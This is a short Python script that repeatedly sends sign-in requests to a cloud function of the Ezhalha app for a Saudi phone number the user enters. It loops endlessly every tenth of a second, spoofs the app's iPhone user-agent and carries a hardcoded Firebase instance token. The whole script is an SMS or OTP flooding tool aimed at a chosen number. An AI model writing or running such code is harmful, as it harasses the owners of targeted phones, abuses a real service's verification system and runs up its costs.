import requests
import json
import sys

def send_post_request(phone):
    # Set the URL and data for the POST request
    url = 'https://us-central1-ezhalha-275202.cloudfunctions.net/userSignIn'
    data = { "data": { "app": "provider", "mobileNumber": "+966" + phone } }
    headers = {
        'Host': 'us-central1-ezhalha-275202.cloudfunctions.net',
        'Accept': '*/*',
        'Content-Type': 'application/json',
        'Firebase-Instance-Id-Token': 'feuoJDdvNU38hE17JcW10Q:APA91bEPkC8oQW-1jdMFp_gu1WO852KqbufOuE8hETWWWJ1I2F_khRL6-uwVLYpmJgHiPUetMfP4_Ig3wz4d4GNWYCZhBb9UpQUR7MWwmpTIKOwfDbkLzj4LSvcB24QW5Kku03uGVivm',
        'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'gaintpace.Ezhalha/8.5 iPhone/16.3.1 hw/iPhone14_2',
        'Accept-Language': 'ar'
    }

    # Make the POST request
    response = requests.post(url, headers=headers, json=data)

    # Output the response
    print(f"\rsend {random} successfully", end="")
    sys.stdout.flush()

phone = input("Enter number: ")
random = 0

# Main loop
while True:
    send_post_request(phone)
    random += 1
    # Add a delay between requests to avoid spamming the server (adjust as needed)
    import time
    time.sleep(0.1)
